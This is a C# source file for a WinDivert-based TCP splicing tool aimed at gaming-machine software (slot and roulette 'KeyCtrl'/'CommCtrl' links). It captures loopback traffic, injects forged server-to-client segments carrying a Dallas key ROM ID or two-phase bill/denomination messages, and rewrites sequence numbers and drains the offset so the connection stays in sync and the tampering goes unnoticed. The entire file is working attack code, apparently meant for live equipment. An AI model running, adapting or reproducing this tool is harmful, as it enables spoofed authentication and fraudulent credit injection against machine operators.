/*
 * DallasSpliceRoulette.cs  -- roulette fork of DallasSplice (DO NOT replace slot tool).
 *
 * Slot uses CommCtrl:30800 <-> OneHand. Roulette KeyCtrl/KeybdEmul uses
 * CommCtrl:30300 <-> ruleta (see lab/roulette/README.md).
 *
 * Extra vs slot:
 *   - default SERVER_PORT 30300 (override with 8th arg)
 *   - logs S2C/C2S payloads (ascii/hex) so we can learn framing on a live tap
 *   - inject payload may be multi-line (use "|||" as line separator in romAscii,
 *     e.g. 700|||701|||01D68A721B000019  -> 700\r\n701\r\nROM\r\n)
 *
 * Build:
 *   csc /platform:x64 /nologo /out:DallasSpliceRoulette.exe DallasSpliceRoulette.cs
 *
 * Usage:
 *   DallasSpliceRoulette.exe <ephemPort> <passthru|inject|heal|capture|billinject> <runSeconds>
 *       <injectAfterMs> [romAscii] [initialDelta] [drainReserveSec] [serverPort]
 */

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

internal static class DallasSpliceRoulette
{
    private static int SERVER_PORT = 30300;
    private static string _sidecarDir = ".";
    private const int LAYER_NETWORK = 0;
    private const ulong FLAG_NONE = 0;          // divert (blocking)
    private const ulong NO_IP_CHECKSUM = 1;     // compute TCP, leave IP as-is (loopback)
    private static readonly IntPtr INVALID = new IntPtr(-1);

    [StructLayout(LayoutKind.Sequential, Size = 80)]
    private struct WinDivertAddress
    {
        public long Timestamp;
        public uint Flags;
        public uint Reserved2;
        public ulong U0, U1, U2, U3, U4, U5, U6, U7;
    }

    [DllImport("WinDivert.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr WinDivertOpen(string filter, int layer, short priority, ulong flags);
    [DllImport("WinDivert.dll", SetLastError = true)]
    private static extern bool WinDivertRecv(IntPtr handle, byte[] pPacket, uint packetLen, out uint recvLen, ref WinDivertAddress addr);
    [DllImport("WinDivert.dll", SetLastError = true)]
    private static extern bool WinDivertSend(IntPtr handle, byte[] pPacket, uint packetLen, out uint sendLen, ref WinDivertAddress addr);
    [DllImport("WinDivert.dll", SetLastError = true)]
    private static extern bool WinDivertHelperCalcChecksums(byte[] pPacket, uint packetLen, ref WinDivertAddress addr, ulong flags);
    [DllImport("WinDivert.dll", SetLastError = true)]
    private static extern bool WinDivertClose(IntPtr handle);

    private static IntPtr _handle = INVALID;
    private static volatile bool _running = true;

    // connection state
    private static long _delta = 0;
    private static bool _haveS2c = false, _haveC2s = false;
    private static byte[] _s2cHdr, _c2sHdr;          // IP+TCP header templates (20+20)
    private static int _s2cIpLen = 20, _c2sIpLen = 20;
    private static WinDivertAddress _s2cAddr, _c2sAddr;
    private static uint _clientSndNxt = 0;            // client's snd.nxt (real)
    private static int _clientWindow = 8192;

    private static int Main(string[] args)
    {
        if (args.Length < 4)
        {
            Console.Error.WriteLine("usage: DallasSpliceRoulette.exe <ephemPort> <passthru|inject|heal|capture|billinject> <runSeconds> <injectAfterMs> [romAscii] [initialDelta] [drainReserveSec] [serverPort]");
            return 2;
        }

        int ephem = int.Parse(args[0]);
        string mode = args[1].ToLowerInvariant();
        int runSeconds = int.Parse(args[2]);
        int injectAfterMs = int.Parse(args[3]);
        string romAscii = args.Length >= 5 ? args[4] : "01D68A721B000019";
        long initialDelta = args.Length >= 6 ? long.Parse(args[5]) : 0;
        int drainReserveSec = args.Length >= 7 ? int.Parse(args[6]) : 6;
        if (args.Length >= 8) SERVER_PORT = int.Parse(args[7]);

        try
        {
            string loc = System.Reflection.Assembly.GetExecutingAssembly().Location;
            if (!string.IsNullOrEmpty(loc))
                _sidecarDir = System.IO.Path.GetDirectoryName(loc) ?? ".";
            else
                _sidecarDir = Environment.CurrentDirectory;
        }
        catch { _sidecarDir = Environment.CurrentDirectory; }

        bool doBillInject = (mode == "billinject");
        bool doInject = (mode == "inject" || doBillInject);
        bool doHeal = (mode == "heal");
        bool doCapture = (mode == "capture" || mode == "passthru");
        byte[] rom = BuildPayload(romAscii);
        byte[] billPhase1 = null, billPhase2 = null;
        if (doBillInject)
        {
            const string phaseSep = "||PHASE||";
            int sep = romAscii.IndexOf(phaseSep, StringComparison.Ordinal);
            if (sep >= 0)
            {
                billPhase1 = BuildPayload(romAscii.Substring(0, sep));
                billPhase2 = BuildPayload(romAscii.Substring(sep + phaseSep.Length));
            }
            else
            {
                billPhase1 = BuildPayload(romAscii);
                billPhase2 = new byte[0];
            }
        }

        string filter = string.Format(
            "loopback and tcp and ((tcp.SrcPort == {0} and tcp.DstPort == {1}) or (tcp.SrcPort == {1} and tcp.DstPort == {0}))",
            SERVER_PORT, ephem);

        // Redirected stdout is block-buffered; force line flush + file sidecars for WinRM poller.
        try
        {
            var stdout = new System.IO.StreamWriter(Console.OpenStandardOutput()) { AutoFlush = true };
            Console.SetOut(stdout);
        }
        catch { }

        Log("mode={0} serverPort={1} ephem={2} runSeconds={3} injectAfterMs={4} romLen={5} initialDelta={6} drainReserveSec={7} dir={8}",
            mode, SERVER_PORT, ephem, runSeconds, injectAfterMs,
            doBillInject ? (billPhase1.Length + billPhase2.Length) : rom.Length,
            initialDelta, drainReserveSec, _sidecarDir);

        _handle = WinDivertOpen(filter, LAYER_NETWORK, 0, FLAG_NONE);
        if (_handle == INVALID)
        {
            Log("FATAL: WinDivertOpen failed err={0}", Marshal.GetLastWin32Error());
            return 1;
        }
        Log("WinDivert opened (divert mode). Watching connection...");

        if (doHeal) _delta = initialDelta;

        var watchdog = new Thread(() =>
        {
            for (int i = 0; i < runSeconds && _running; i++) Thread.Sleep(1000);
            _running = false;
            try { WinDivertClose(_handle); } catch { }
        });
        watchdog.IsBackground = true;
        watchdog.Start();
        Console.CancelKeyPress += (s, e) => { e.Cancel = true; _running = false; try { WinDivertClose(_handle); } catch { } };

        var packet = new byte[65535];
        var addr = new WinDivertAddress();
        var sw = Stopwatch.StartNew();
        bool injected = false;
        bool draining = doHeal;     // heal drains from the start
        bool sawBz1 = false;
        bool sawBlAck = false;
        int billInjectPhase = 0;    // 0=wait 999 after BZ1, 1=wait BL ack, 2=done
        long s2c = 0, c2s = 0, drained = 0;
        int drainStartMs = (runSeconds - drainReserveSec) * 1000;

        try
        {
            while (_running)
            {
                uint recvLen;
                if (!WinDivertRecv(_handle, packet, (uint)packet.Length, out recvLen, ref addr))
                {
                    if (!_running) break;
                    continue;
                }

                int ipLen = (packet[0] & 0x0F) * 4;
                int t = ipLen;
                int srcPort = ReadU16(packet, t + 0);
                int dstPort = ReadU16(packet, t + 2);
                int tcpLen = ((packet[t + 12] >> 4) & 0x0F) * 4;
                int totalLen = ReadU16(packet, 2);
                int payLen = totalLen - ipLen - tcpLen;
                bool s2cDir = (srcPort == SERVER_PORT && dstPort == ephem);

                // After inject, drain on the very next packets (don't wait for end-of-run).
                // Two-phase billinject waits until phase2 before draining.
                if (doInject && injected && !draining && _delta > 0
                    && (!doBillInject || billInjectPhase >= 2))
                {
                    draining = true;
                    Log("DRAIN phase begin (delta={0})", _delta);
                }

                if (s2cDir)
                {
                    s2c++;
                    uint seq = ReadU32(packet, t + 4);
                    uint srvAck = ReadU32(packet, t + 8);
                    int win = ReadU16(packet, t + 14);
                    if (!_haveS2c)
                    {
                        _s2cIpLen = ipLen;
                        _s2cHdr = new byte[ipLen + 20];
                        Array.Copy(packet, 0, _s2cHdr, 0, ipLen + 20);
                        _s2cAddr = addr; _haveS2c = true;
                        Log("S2C template seq={0} ack={1} payLen={2}", seq, srvAck, payLen);
                    }
                    if (doCapture && payLen > 0)
                        LogPayload("S2C", packet, ipLen + tcpLen, payLen);

                    if (draining && _delta > 0 && payLen > 0 && _haveC2s)
                    {
                        // Swallow up to delta bytes; ACK the whole real segment to the server.
                        int swallow = (int)Math.Min((long)payLen, _delta);
                        int tail = payLen - swallow;
                        InjectAckToServer(_clientSndNxt, (uint)(seq + (uint)payLen), _clientWindow);
                        if (tail > 0)
                        {
                            int off = ipLen + tcpLen + swallow;
                            SendS2cData((uint)(seq + (uint)_delta), srvAck, win, packet, off, tail);
                        }
                        _delta -= swallow;
                        drained += swallow;
                        // original packet dropped (not re-injected)
                        if (_delta == 0)
                        {
                            Log("DRAIN complete -> connection back in sync (drained={0})", drained);
                            if (doHeal || doInject) { _running = false; try { WinDivertClose(_handle); } catch { } break; }
                        }
                        continue;
                    }

                    // Normal forward with seq rewrite.
                    if (_delta != 0) WriteU32(packet, t + 4, (uint)(seq + (uint)_delta));
                    Reinject(packet, recvLen, ref addr);

                    if (doBillInject && !draining && _haveS2c && billInjectPhase == 0 && sawBz1 && payLen > 0)
                    {
                        string s2cAsc = PayloadAscii(packet, ipLen + tcpLen, payLen);
                        if (s2cAsc.Contains("999"))
                        {
                            // After zone-ack 999, inject phase1 (denom burst); phase2 waits for BL/CN ack.
                            uint realNext = (uint)(seq + (uint)payLen);
                            uint injSeq = (uint)(realNext + (uint)_delta);
                            InjectRom(injSeq, srvAck, win, billPhase1);
                            _delta += billPhase1.Length;
                            if (billPhase2 != null && billPhase2.Length > 0)
                            {
                                billInjectPhase = 1;
                                Log("BILL_INJECT phase1 after 999: bytes={0} delta={1}", billPhase1.Length, _delta);
                            }
                            else
                            {
                                billInjectPhase = 2;
                                injected = true;
                                Log("BILL_INJECT after 999: bytes={0} delta={1}", billPhase1.Length, _delta);
                            }
                            try
                            {
                                System.IO.File.WriteAllText(
                                    System.IO.Path.Combine(_sidecarDir, "inject.flag"),
                                    string.Format("{0:o} phase1 bytes={1}\r\n", DateTime.Now, billPhase1.Length));
                            }
                            catch { }
                        }
                    }
                    else if (doBillInject && !draining && _haveS2c && billInjectPhase == 1 && sawBlAck
                             && billPhase2 != null && billPhase2.Length > 0)
                    {
                        uint realNext = (uint)(seq + (uint)payLen);
                        uint injSeq = (uint)(realNext + (uint)_delta);
                        InjectRom(injSeq, srvAck, win, billPhase2);
                        _delta += billPhase2.Length;
                        billInjectPhase = 2;
                        injected = true;
                        Log("BILL_INJECT phase2 after BL/CN ack: bytes={0} delta={1}", billPhase2.Length, _delta);
                        try
                        {
                            System.IO.File.WriteAllText(
                                System.IO.Path.Combine(_sidecarDir, "inject.flag"),
                                string.Format("{0:o} bytes={1}\r\n", DateTime.Now, billPhase1.Length + billPhase2.Length));
                        }
                        catch { }
                    }
                    else if (doInject && !doBillInject && !injected && !draining && _haveS2c && sw.ElapsedMilliseconds >= injectAfterMs)
                    {
                        uint realNext = (uint)(seq + (uint)payLen);
                        uint injSeq = (uint)(realNext + (uint)_delta);
                        InjectRom(injSeq, srvAck, win, rom);
                        _delta += rom.Length;
                        injected = true;
                        Log("INJECTED ROM: clientSeq={0} ack={1} bytes={2} delta={3}", injSeq, srvAck, rom.Length, _delta);
                        try
                        {
                            System.IO.File.WriteAllText(
                                System.IO.Path.Combine(_sidecarDir, "inject.flag"),
                                string.Format("{0:o} bytes={1}\r\n", DateTime.Now, rom.Length));
                        }
                        catch { }
                    }
                }
                else
                {
                    c2s++;
                    uint cseq = ReadU32(packet, t + 4);
                    int cwin = ReadU16(packet, t + 14);
                    if (!_haveC2s)
                    {
                        _c2sIpLen = ipLen;
                        _c2sHdr = new byte[ipLen + 20];
                        Array.Copy(packet, 0, _c2sHdr, 0, ipLen + 20);
                        _c2sAddr = addr; _haveC2s = true;
                        Log("C2S template seq={0} win={1}", cseq, cwin);
                    }
                    // Slot KeyCtrl often has long S2C gaps while C2S (HP/CN/ID) keeps ticking.
                    // Once we have an S2C template, force-inject on the next C2S after injectAfterMs.
                    if (doInject && !doBillInject && !injected && !draining && _haveS2c
                        && sw.ElapsedMilliseconds >= injectAfterMs)
                    {
                        uint srvAck = ReadU32(packet, t + 8);
                        // S2C next seq ≈ client's ACK (bytes the client has already accepted).
                        uint injSeq = (uint)(srvAck + (uint)_delta);
                        int win = 8192;
                        InjectRom(injSeq, (uint)(cseq + (uint)payLen), win, rom);
                        _delta += rom.Length;
                        injected = true;
                        Log("INJECTED ROM (on C2S): clientSeq={0} ack={1} bytes={2} delta={3}",
                            injSeq, cseq + (uint)payLen, rom.Length, _delta);
                        try
                        {
                            System.IO.File.WriteAllText(
                                System.IO.Path.Combine(_sidecarDir, "inject.flag"),
                                string.Format("{0:o} bytes={1} via=c2s\r\n", DateTime.Now, rom.Length));
                        }
                        catch { }
                    }
                    if (doCapture && payLen > 0)
                        LogPayload("C2S", packet, ipLen + tcpLen, payLen);
                    if (doBillInject && payLen > 0)
                    {
                        string c2sAsc = PayloadAscii(packet, ipLen + tcpLen, payLen);
                        if (c2sAsc.Contains("BZ 1"))
                        {
                            sawBz1 = true;
                            Log("BILL_INJECT saw BZ 1");
                        }
                        if (billInjectPhase == 1 && (c2sAsc.Contains("BL 1\r\n") || c2sAsc.Contains("CN 1\r\n")
                                || c2sAsc.Contains("BL 10\r") || c2sAsc.Contains("BL 10\r\n")))
                        {
                            sawBlAck = true;
                            Log("BILL_INJECT saw BL/CN ack");
                        }
                    }
                    uint cNext = (uint)(cseq + (uint)payLen);
                    if (Seq32Gt(cNext, _clientSndNxt) || _clientSndNxt == 0) _clientSndNxt = cNext;
                    _clientWindow = cwin;

                    if (_delta != 0)
                    {
                        uint ack = ReadU32(packet, t + 8);
                        WriteU32(packet, t + 8, (uint)(ack - (uint)_delta));
                    }
                    Reinject(packet, recvLen, ref addr);
                }
            }
        }
        catch (Exception ex) { Log("EXCEPTION: {0}", ex.Message); }
        finally { try { WinDivertClose(_handle); } catch { } }

        Log("DONE. s2c={0} c2s={1} injected={2} drained={3} finalDelta={4}", s2c, c2s, injected, drained, _delta);
        if (_delta != 0) Log("WARNING: stopped with delta={0} -- connection may be desynced.", _delta);
        else Log("Connection left in sync (delta=0).");
        return 0;
    }

    private static void Reinject(byte[] packet, uint len, ref WinDivertAddress addr)
    {
        WinDivertHelperCalcChecksums(packet, len, ref addr, NO_IP_CHECKSUM);
        uint sent;
        if (!WinDivertSend(_handle, packet, len, out sent, ref addr))
            Log("WARN: reinject failed err={0}", Marshal.GetLastWin32Error());
    }

    // Build a server->client data segment with arbitrary payload (used for ROM + drain tail).
    private static void SendS2cData(uint seq, uint ack, int window, byte[] src, int srcOff, int payLen)
    {
        int ip = _s2cIpLen, t = ip;
        int total = ip + 20 + payLen;
        var pkt = new byte[total];
        Array.Copy(_s2cHdr, 0, pkt, 0, ip + 20);
        WriteU16(pkt, 2, (uint)total);
        WriteU16(pkt, 4, (uint)(ReadU16(pkt, 4) + 1));
        WriteU16(pkt, 10, 0);
        WriteU32(pkt, t + 4, seq);
        WriteU32(pkt, t + 8, ack);
        pkt[t + 12] = 0x50;
        pkt[t + 13] = 0x18;            // PSH|ACK
        WriteU16(pkt, t + 14, (uint)window);
        WriteU16(pkt, t + 16, 0);
        WriteU16(pkt, t + 18, 0);
        Array.Copy(src, srcOff, pkt, ip + 20, payLen);
        var a = _s2cAddr;
        WinDivertHelperCalcChecksums(pkt, (uint)total, ref a, NO_IP_CHECKSUM);
        uint sent;
        if (!WinDivertSend(_handle, pkt, (uint)total, out sent, ref a))
            Log("WARN: s2c-data send failed err={0}", Marshal.GetLastWin32Error());
    }

    private static void InjectRom(uint seq, uint ack, int window, byte[] rom)
    {
        SendS2cData(seq, ack, window, rom, 0, rom.Length);
    }

    // Build a client->server pure-ACK to advance the server when we swallow bytes.
    private static void InjectAckToServer(uint seq, uint ack, int window)
    {
        int ip = _c2sIpLen, t = ip;
        int total = ip + 20;
        var pkt = new byte[total];
        Array.Copy(_c2sHdr, 0, pkt, 0, ip + 20);
        WriteU16(pkt, 2, (uint)total);
        WriteU16(pkt, 4, (uint)(ReadU16(pkt, 4) + 1));
        WriteU16(pkt, 10, 0);
        WriteU32(pkt, t + 4, seq);
        WriteU32(pkt, t + 8, ack);
        pkt[t + 12] = 0x50;
        pkt[t + 13] = 0x10;            // ACK
        WriteU16(pkt, t + 14, (uint)window);
        WriteU16(pkt, t + 16, 0);
        WriteU16(pkt, t + 18, 0);
        var a = _c2sAddr;
        WinDivertHelperCalcChecksums(pkt, (uint)total, ref a, NO_IP_CHECKSUM);
        uint sent;
        if (!WinDivertSend(_handle, pkt, (uint)total, out sent, ref a))
            Log("WARN: ack-to-server send failed err={0}", Marshal.GetLastWin32Error());
    }

    private static byte[] BuildPayload(string romAscii)
    {
        // "700|||701|||01D68..." -> multi-line CRLF payload (slot-style insert context)
        if (romAscii.IndexOf("|||", StringComparison.Ordinal) >= 0)
        {
            string[] parts = romAscii.Split(new[] { "|||" }, StringSplitOptions.None);
            var sb = new StringBuilder();
            foreach (string p in parts)
            {
                sb.Append(p);
                sb.Append("\r\n");
            }
            return Encoding.ASCII.GetBytes(sb.ToString());
        }
        return Encoding.ASCII.GetBytes(romAscii + "\r\n");
    }

    private static int _payloadLogs;
    private static string PayloadAscii(byte[] packet, int off, int payLen)
    {
        int n = Math.Min(payLen, 128);
        var sb = new StringBuilder(n);
        for (int i = 0; i < n; i++)
        {
            byte b = packet[off + i];
            if (b >= 32 && b < 127) sb.Append((char)b);
        }
        return sb.ToString();
    }

    private static void LogPayload(string dir, byte[] packet, int off, int payLen)
    {
        if (_payloadLogs >= 80) return;
        _payloadLogs++;
        int n = Math.Min(payLen, 64);
        var hex = new StringBuilder(n * 3);
        var asc = new StringBuilder(n);
        for (int i = 0; i < n; i++)
        {
            byte b = packet[off + i];
            hex.AppendFormat("{0:X2} ", b);
            asc.Append((b >= 32 && b < 127) ? (char)b : '.');
        }
        if (payLen > n) { hex.Append("..."); asc.Append("..."); }
        Log("{0} pay={1} ascii=[{2}] hex=[{3}]", dir, payLen, asc, hex.ToString().Trim());
    }

    private static bool Seq32Gt(uint a, uint b) { return (int)(a - b) > 0; }
    private static int ReadU16(byte[] b, int o) { return (b[o] << 8) | b[o + 1]; }
    private static uint ReadU32(byte[] b, int o) { return ((uint)b[o] << 24) | ((uint)b[o + 1] << 16) | ((uint)b[o + 2] << 8) | b[o + 3]; }
    private static void WriteU16(byte[] b, int o, uint v) { b[o] = (byte)((v >> 8) & 0xFF); b[o + 1] = (byte)(v & 0xFF); }
    private static void WriteU32(byte[] b, int o, uint v) { b[o] = (byte)((v >> 24) & 0xFF); b[o + 1] = (byte)((v >> 16) & 0xFF); b[o + 2] = (byte)((v >> 8) & 0xFF); b[o + 3] = (byte)(v & 0xFF); }

    private static void Log(string fmt, params object[] a)
    {
        string line = string.Format("[{0:HH:mm:ss.fff}] {1}", DateTime.Now, string.Format(fmt, a));
        Console.WriteLine(line);
        try { Console.Out.Flush(); } catch { }
        try
        {
            System.IO.File.AppendAllText(
                System.IO.Path.Combine(_sidecarDir, "splice_live.log"),
                line + Environment.NewLine);
        }
        catch { }
    }
}
